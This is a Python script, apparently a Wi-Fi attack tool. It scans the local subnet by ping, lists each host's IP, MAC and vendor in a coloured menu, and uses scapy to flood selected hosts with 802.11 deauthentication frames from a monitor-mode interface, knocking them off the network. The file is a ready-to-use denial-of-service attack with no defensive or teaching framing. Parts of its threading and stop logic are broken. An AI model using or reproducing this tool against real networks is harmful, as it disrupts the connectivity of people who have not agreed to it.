#!/usr/bin/python
import threading,os,sys,subprocess,time,uuid,re
from scapy.all import *
ip_list = []
activation = False
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, CYAN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\33[36m', '\033[0m'
if "-h" in sys.argv:
	sys.stdout.write(MAGENTA + 'TARGET USAGE:' + '\n')
	sys.stdout.write(YELLOW + 'Just enter the index of your target' + '\n')
	sys.stdout.write(YELLOW + "example: '1' (single choice), '14563' (multiple choices)" + '\n' + '\n')
	sys.stdout.write(MAGENTA + 'COMMANDS:' + '\n')
	sys.stdout.write(MAGENTA + 'start/stop deauth '+ YELLOW + '- Start or stop sending deauth packet to targets' + '\n')
	sys.stdout.write(MAGENTA + 'gateway x '+ YELLOW + "- set the gateway. type in the gateway number insthead of 'x'" + '\n')
	sys.stdout.write(MAGENTA + 'interface '+ YELLOW + '- try to find an interface on monitor mode' + '\n')
	sys.stdout.write(MAGENTA + 'exit '+ YELLOW + '- quit the script' + '\n')
	exit()
os.system('clear')
def displayer(style, text, option = None):
	if style == 'sucess':
		contain = GREEN + '+'
	if style == 'failure':
		contain = RED + '-'
	if style == 'info':
		contain = BLUE + '?'
	if style == 'error':
		contain = WHITE + '!'
	if option == 'noreturn':
		rtn = ''
	else:
		rtn = '\n'
	prefix = MAGENTA + '[' + contain + MAGENTA + '] ' + YELLOW
	sys.stdout.write(prefix + text + rtn)
if "-pt" in sys.argv:
	index = sys.argv.index('-pt')
	ping_time = sys.argv[index+1]
	displayer('info', 'ping time set to '+ping_time)
if "-i" in sys.argv:
	index = sys.argv.index('-i')
	preset_iface = sys.argv[index+1]
	displayer('info', 'interface set to '+preset_iface)
if "-ip" in sys.argv:
	index = sys.argv.index('-ip')
	preset_user_ip = sys.argv[index+1]
	displayer('info', 'user ip set to '+preset_user_ip)
if "--debug" in sys.argv:
	debug = True
	displayer('info', 'debug mode on')
def ip_finder():
	output=subprocess.getoutput("ip -4 addr show " + "eth0" + " | grep -oP '(?<=inet\s)\d+(\.\d+){3}'")
	displayer('sucess','user ip found ', 'noreturn');print(output)
	try:
		global preset_user_ip
		return preset_user_ip
	except:
		return output

def ping(ip, thread_name, user_ip, t, display = None):
	try:
		process = subprocess.check_output(["ping", "-c", str(t), ip])
		displayer('sucess','host up ', 'noreturn');print(ip)
		global ip_list
		ip_list.append(ip)
	except:
		if display == True:
			displayer('failure','host down ', 'noreturn');print(ip)

def scanner():
	try:
		global ping_time
		ping_time = int(ping_time)
	except:
		ping_time = 4
	displayer('info','scaning on network')
	ip = str(ip_finder())
	scan_range = 255
	display = False
	try:
		if ip[-2] == '.':
			ip_cropped = ip[:-1]
	except:
		wrong_size = True
	try:
		if ip[-3] == '.':
			ip_cropped = ip[:-2]
	except:
		wrong_size = True
	for i in range(scan_range):
		ip_inscan = ip_cropped+str(i)
		thread_name = 'thread-'+str(i)
		thread_name = threading.Thread(target = ping, args = (ip_inscan, thread_name, ip, ping_time, display))
		time.sleep(.001)
		thread_name.start()
	global ip_list
	time.sleep(ping_time)
	return(ip_list)

def vendor(mac_adress):
	def treat(text):
		def split(word):
			return [char for char in word]
		alpha = split('1234567890AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn:')
		def remove_text(string):
			while string[0] in alpha:
				string = string[1:]
			return string
		def remove_space(string):
			while string[0] not in alpha:
				string = string[1:]
			return string
		text = remove_text(text)
		text = remove_space(text)
		text = remove_text(text)
		return remove_space(text).rstrip()
	displayer('info', 'resolving vendor of ', 'noreturn');print(mac_adress)
	mac_adress = mac_adress[:-9]
	mac_adress = mac_adress.upper()
	search = open("manuf")
	for line in search:
		if mac_adress in line:
			return treat(line)

def resolve_mac(ip):
	displayer('info','resolving mac of ', 'noreturn');print(ip)
	ip_check = ''
	sub_index_list = []
	index_list = []
	output=subprocess.getoutput("arp -an")
	for i in range(len(output)):
		if output[i] == '(':
			sub_index_list.append(i+1)
		if output[i] == ')':
			sub_index_list.append(i)
		if len(sub_index_list) == 2:
			index_list.append(sub_index_list)
			sub_index_list = []
	for i in range(len(index_list)):
		ip_check=output[index_list[i][0]:index_list[i][1]]
		if ip_check == ip:
			mac = output[index_list[i][1]+5:index_list[i][1]+22]
			return mac
	if ip_check != ip:
		return (':'.join(re.findall('..', '%012x' % uuid.getnode())))

def deauth(gateway_mac, target_mac, iface, deauth_aut):
	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
	while deauth_aut == True:
		sendp(packet, inter=0.1, count=1, iface=iface, verbose=0)

def infoga():
	hosts_info = []
	hosts_temp = []
	ip = scanner()
	for i in range(len(ip)):
		mac = resolve_mac(ip[i])
		hosts_temp.append(ip[i])
		hosts_temp.append(mac)
		if mac!=None:
			hosts_temp.append(vendor(mac))
		else:
			o=0
		hosts_info.append(hosts_temp)
		hosts_temp = []
	return hosts_info

def interface():
	try:
		global preset_iface
		return preset_iface
	except:
		displayer('info', 'looking for wireless interface in monitor mode')
		output=subprocess.getoutput("ifconfig")
		output_value = output.find("mon")
		if output_value == -1:
			displayer('failure', 'interface on monitor mode not found')
			return('not found')
		displayer('sucess', str(output[output_value-5:output_value+3])+' Found')
		return(output[output_value-5:output_value+3])

def save(list):
	os.system('clear')
	displayer('info','Saving current hosts')

def main(debug = False):
	hosts = infoga()
	ip_current = ip_finder()
	iface = interface()
	selected = []
	msg='                                                                              '
	activation=''
	gw=subprocess.getoutput("ip route show default | awk '/default/ {print $3}'")
	if debug == True:
		sys.stdout.write('press ENTER to continue. ')
		input()
	def menu(hosts, selected, msg, activation, gw, iface):
		space = ' '
		os.system('clear')
		def show_help():
			os.system('clear')
			sys.stdout.write(MAGENTA + 'TARGET USAGE:' + '\n')
			sys.stdout.write(YELLOW + 'Just enter the index of your target' + '\n')
			sys.stdout.write(YELLOW + "example: '1' (single choice), '14563' (multiple choices)" + '\n' + '\n')
			sys.stdout.write(MAGENTA + 'COMMANDS:' + '\n')
			sys.stdout.write(MAGENTA + 'start/stop deauth '+ YELLOW + '- Start or stop sending deauth packet to targets' + '\n')
			sys.stdout.write(MAGENTA + 'gateway x '+ YELLOW + "- set the gateway. type in the gateway number insthead of 'x'" + '\n')
			sys.stdout.write(MAGENTA + 'interface '+ YELLOW + '- try to find an interface on monitor mode' + '\n')
			sys.stdout.write(MAGENTA + 'exit '+ YELLOW + '- quit the script' + '\n')
			sys.stdout.write(MAGENTA + 'press enter to return to the menu...')
			enter_to_menu = input()
			menu(hosts, selected, msg, activation, gw, iface)
		def line():
			sys.stdout.write(RED + '+' + YELLOW + '-------'+ RED + '+' + YELLOW + '-----------------'+ RED + '+' + YELLOW + '-------------------'+ RED + '+' + YELLOW + '--------------------------------' + RED + '+' + '\n')
		line()
		sys.stdout.write(YELLOW + '|' + BLUE + ' INDEX ' + YELLOW + '|' + BLUE +'   IP ADDRESS    '+ YELLOW + '|' + BLUE + '    MAC ADDRESS    ' + YELLOW + '|' + BLUE + '             VENDOR             ' + YELLOW + '|' + '\n')
		line()
		for i in range(len(hosts)):
			ip_display = str(hosts[i][0])
			mac_display = str(hosts[i][1])
			mac_vendor_display = str(hosts[i][2])
			while len(ip_display)<15:
				ip_display = ip_display + ' '
			while len(mac_display)<17:
				mac_display = mac_display + ' '
			while len(mac_vendor_display)<30:
				mac_vendor_display = mac_vendor_display + ' '
			while len(mac_vendor_display)>30:
				mac_vendor_display = mac_vendor_display[:1]
			if ip_current == str(hosts[i][0]):
				color = RED
			else:
				color = GREEN
			if hosts[i][0]==gw:
				color = MAGENTA
			for j in range(len(selected)):
				if selected[j][0] in ip_display:
					color = CYAN
			sys.stdout.write(YELLOW + '| ' + MAGENTA + ' [' + color + str(i) + MAGENTA + ']' + YELLOW + '  | ' + ip_display + ' | ' + mac_display + ' | ' + mac_vendor_display + ' | ' + '\n')
		line()
		try:
			if activation == False:
				status = BLUE + ' DEAUTH_ATTACK = ' + RED + 'OFF' + YELLOW
			if activation == True:
				status = BLUE + ' DEAUTH_ATTACk = ' + GREEN + 'ON ' + YELLOW
		except:
			useless = True
		try:
			status
		except:
			status = BLUE + ' DEAUTH_ATTACK = ' + RED + 'OFF' + YELLOW
		sys.stdout.write(YELLOW + '| ' +GREEN + 'GREEN' + BLUE + ' = ' + YELLOW + 'regular host' + YELLOW + '                                                         |' + '\n')
		sys.stdout.write(YELLOW + '| ' +RED + 'RED' + BLUE + ' = ' + YELLOW + 'your machine' + YELLOW + '                                                           |' + '\n')
		sys.stdout.write(YELLOW + '| ' +MAGENTA + 'MAGENTA' + BLUE + ' = ' + YELLOW + 'gateway' + YELLOW + '                                                            |' + '\n')
		sys.stdout.write(YELLOW + '| ' +CYAN + 'CYAN' + BLUE + ' = ' + YELLOW + 'selected devices' + YELLOW + '                                                      |' + '\n')
		sys.stdout.write(RED + '+' + YELLOW + '------------------------------------------------------------------------------' + RED + '+' + '\n')
		sys.stdout.write(YELLOW + '|'+ BLUE + ' monitor interface = '+ YELLOW +iface +space*(57-len(iface))+'|' + '\n')
		sys.stdout.write(YELLOW + '|'+ status +'                                                          |' + '\n')
		sys.stdout.write(YELLOW + '|'+ msg +'|' + '\n')
		sys.stdout.write(RED + '+' + YELLOW + '------------------------------------------------------------------------------' + RED + '+' + '\n')
		sys.stdout.write(MAGENTA + "> " )
		choice = input()
		if choice == '':
			msg='                                                                              '
			menu(hosts, selected, msg, activation, gw, iface)
		if choice == 'help':
			show_help()
		if choice == 'interface':
			os.system('clear')
			iface = interface()
			msg='                                                                              '
			menu(hosts, selected, msg, activation, gw, iface)
		if choice == 'start deauth':
			if len(selected) == 0:
				msg=' no target                                                                    '
				menu(hosts, selected, msg, activation, gw, iface)
			if iface == 'not found':
				msg=' no interface on monitor mode                                                 '
				menu(hosts, selected, msg, activation, gw, iface)
			for i in range(len(selected)):
				for j in range(len(hosts)):
					if hosts[j][0] == gw:
						mac_gw = hosts[j][1]
				thread_deauth = 'thread_deauth'+str(i)
				displayer('info', 'starting '+thread_deauth)
				thread_deauth = 'thread-'+str(i)
				thread_deauth = threading.Thread(deauth(selected[i][1], mac_gw, iface, deauth_aut = True))
				thread_deauth.start()
			activation = True
			menu(hosts, selected, msg, activation, gw, iface)
		if choice == 'stop deauth':
			for i in range(len(selected)):
				print('stop arp')
				menu(hosts)
		if choice[0].isdigit() == True:
			if len(choice)==1:
				msg='                                                                              '
				if hosts[int(choice)] in selected:
					if hosts[int(choice)][0] == gw:
						msg=' a selected device is the gateway                                             '
						menu(hosts, selected, msg, activation, gw, iface)
					selected.pop(selected.index(hosts[int(choice)]))
					menu(hosts, selected, msg, activation, gw, iface)
				else:
					if hosts[int(choice)][0] == gw:
						msg=' a selected device is the gateway                                             '
						menu(hosts, selected, msg, activation, gw, iface)
					selected.append(hosts[int(choice)])
					menu(hosts, selected, msg, activation, gw, iface)
			else:
				print(len(choice))
				digitn = 0
				n = []
				for i in range(len(choice)):
					if choice[i].isdigit() == True:
						digitn = digitn + 1
				for i in range(len(choice)):
					if choice[i].isdigit() == True:
						if hosts[int(choice[i])] in selected:
							selected.pop(selected.index(hosts[int(choice[i])]))
						else:
							n.append(choice[i])
							selected.append(hosts[int(choice[i])])
					if len(n) == digitn:
						break
				menu(hosts, selected, msg, activation, gw, iface)
		if choice == 'exit':
			if activation == True:
				print('stop deauth')
			exit()
		if choice[:7]=='gateway':
			gw = hosts[int(choice[8])][0]
			menu(hosts, selected, msg, activation, gw, iface)
		if choice != 'help':
			msg=' invalid command                                                              '
			menu(hosts, selected, msg, activation, gw, iface)
	menu(hosts, selected, msg, activation, gw, iface)
main(debug)
